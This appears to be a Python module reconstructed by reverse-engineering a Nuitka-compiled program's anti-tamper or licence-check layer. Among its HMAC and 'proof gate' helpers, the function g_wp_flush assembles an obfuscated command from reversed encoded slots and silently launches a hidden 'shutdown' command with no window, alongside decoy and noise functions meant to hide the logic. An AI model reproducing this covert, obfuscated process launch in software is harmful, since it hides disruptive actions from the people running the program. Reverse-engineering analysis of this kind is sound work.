# Recovered module: src.py.com.yun.mao.fea._qf_rn_file
# Static reconstruction from the Nuitka module table, the constant chunk and
# the module init at 0x56af250.
#
# The reversed command slot order is reconstructed from the decompiled
# ``g_wp_flush`` body; the four-stage proof gate order is confirmed by the
# decompiled ``ae_iq_bind`` body.
from __future__ import annotations

import hashlib
import hmac
import subprocess
import time
from typing import Any

from ..link._fds_jm import sec
from . import _cmd_ops, _pl_wd_file

# Module metadata
# nuitka_table_index = 1792
# module_init_rva = 0x56af250
# flags = 0x10


def _tg(n: int) -> bytes:
    """Return the private six-byte witness (17 -> 165 -> 255 mix)."""

    value = int(n)
    mixed = bytes((((value * 17) ^ 165) & 255) for _ in range(4))
    return mixed + value.to_bytes(2, "big")


def _mac(key: bytes, parts: bytes | tuple) -> bytes:
    h = hmac.new(bytes(key), digestmod=hashlib.sha256)
    if isinstance(parts, (bytes, bytearray, memoryview)):
        parts = (parts,)
    for part in parts:
        h.update(bytes(part))
    return h.digest()


def _unseal(tag: bytes, cap: Any) -> bool:
    try:
        return bool(_pl_wd_file._unseal(bytes(tag), cap))
    except (AssertionError, TypeError, ValueError):
        return False


def _kid_key(kid: str) -> bytes:
    return hashlib.sha256(str(kid or "").encode("utf-8")).digest()


def _kid_mac(kid: str) -> bytes:
    return _mac(_pl_wd_file._sk, (_tg(75), _kid_key(kid)))


def _noise(x: int) -> int:
    """Mix one integer with the module's confirmed arithmetic slots.

    The decompiled body confirms ``v * 2779096485 + 2135587861``, the 32-bit
    mask, the 5/27-bit shifts and the final ``^ 13``.
    """

    value = int(x)
    mixed = (value * 2779096485 + 2135587861) & 0xFFFFFFFF
    return ((mixed << 5) ^ (mixed >> 27) ^ 13) & 0xFFFFFFFF


def _ready() -> bool:
    return bool(_pl_wd_file._ready and _pl_wd_file._sk is not None)


def _chain_ok(obj: Any) -> bool:
    if not _ready():
        return False
    marker = getattr(obj, "chain_ok", True)
    return bool(marker) and bool(_pl_wd_file._ph)


def _obj_ok(obj: Any) -> bool:
    if obj is None:
        return False
    return not bool(getattr(obj, "blocked", False))


def _gy_ok(obj: Any) -> bool:
    result = _cmd_ops.optional_call(obj, ("gy_ok", "_gy_ok", "on_gy_ok"))
    return True if result is None else bool(result)


def _uc_ok(obj: Any) -> bool:
    module = _cmd_ops.load_attr("src.py.com.yun.mao.fea._sq_jqm")
    info = getattr(module, "current_account_info", None)
    if info is None:
        fn = getattr(obj, "account_valid", None)
        return bool(fn()) if callable(fn) else False
    ensure = getattr(info, "ensure_valid", None)
    if callable(ensure):
        try:
            return bool(ensure())
        except Exception:
            return False
    return bool(getattr(info, "ucode", ""))


def _record(now: float, reason: int, entry: int, n: int, ph: int) -> bool:
    try:
        repeated = bool(_pl_wd_file._bump_suspect_locked(float(now)))
    except (AttributeError, TypeError, ValueError):
        repeated = False
    try:
        _pl_wd_file.q_lg(int(reason), int(reason), int(entry), int(n), int(ph))
    except (AttributeError, TypeError, ValueError):
        pass
    return repeated


def _fail(now: float, reason: int, entry: int, n: int, ph: int) -> bool:
    _record(now, reason, entry, n, ph)
    return False


def _decoy(obj: Any) -> None:
    _ = _noise(len(getattr(obj, "kid", ""))) if obj is not None else _noise(0)
    return None


def _fan_hooks(obj: Any) -> bool:
    result = _cmd_ops.optional_call(
        obj,
        ("proof_ok", "_proof_ok", "on_proof_ok", "fan_hooks"),
    )
    return bool(result) if result is not None else False


def g_wp_flush() -> None:
    """Reverse the encoded slots and launch the hidden ``shutdown`` command."""

    _sy = sec("")
    _z = sec("lc_zi_0w")
    _sp = subprocess
    _rev = "".join(
        reversed(
            (
                sec("sj_ok_7b"),
                sec("wr_yt_3n"),
                sec("hg_ae_6v"),
                sec("pz_uc_1k"),
                sec("xf_dh_9t"),
                sec("qb_ls_2m"),
                sec("nt_wj_8c"),
                sec("kv_rm_4p"),
            )
        )
    )
    _exe = sec("dm_fx_5q")
    _a0 = _exe + sec("kv_rm_4p")
    _a1 = _exe + sec("lc_zi_0w")
    _a2 = _exe + sec("xf_dh_9t")
    _a3 = sec("uy_bp_4h")
    _cf = _sp.CREATE_NO_WINDOW
    try:
        _sp.Popen(
            (_rev, _a0, _a1, _a2, _a3),
            shell=False,
            stdin=_sp.DEVNULL,
            stdout=_sp.DEVNULL,
            stderr=_sp.DEVNULL,
            creationflags=_cf,
        )
    except Exception:
        _ = (_sy, _z)


def ae_iq_bind(obj: Any = None) -> bool:
    """Evaluate the four-stage proof gate and dispatch the hit hook."""

    now = time.time()
    try:
        with _pl_wd_file._g_mz:
            gate = _chain_ok(obj)
            hit = _obj_ok(obj)
            r0 = _pl_wd_file.w_cd(gate, hit, _gy_ok(obj), _uc_ok(obj))
            if r0 != 9:
                return _fail(now, r0, 5, _noise(len(_pl_wd_file._ph)), 0)
        _decoy(obj)
        _g = _fan_hooks(obj)
        return bool(_g or obj is None)
    except Exception:
        return _fail(now, 1, 5, 0, 0)


def j_c4_fold(obj: Any = None) -> None:
    """Public hook entry; the body is the small proof-hook wrapper."""

    try:
        _fan_hooks(obj)
    except Exception:
        return None
    return None

